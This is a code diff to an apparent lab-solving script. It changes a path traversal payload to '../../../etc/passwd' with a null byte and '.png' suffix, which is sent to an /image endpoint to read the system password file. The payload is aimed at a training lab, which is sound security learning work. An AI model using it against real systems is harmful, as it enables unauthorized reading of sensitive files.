@@ -4,11 +4,9 @@ from urllib.parse import urlencode
 
 def solve_lab(session):
     path = "/image"
-    params = {"filename": "/etc/passwd"}
+    params = { "filename": "../../../etc/passwd\0.png" }
 
-    print_info(
-        f'Exploiting path traversal vulnerability by visiting "{path}?{urlencode(params)}"...'
-    )
+    print_info(f"Exploiting path traversal vulnerability by visiting \"{path}?{urlencode(params)}\"...")
     resp = session.get_path(path, params=params)
 
     if resp.status_code != 200:
@@ -16,3 +14,4 @@ def solve_lab(session):
     else:
         print_success("GET request came back with the following response:")
         print(resp.text)
+
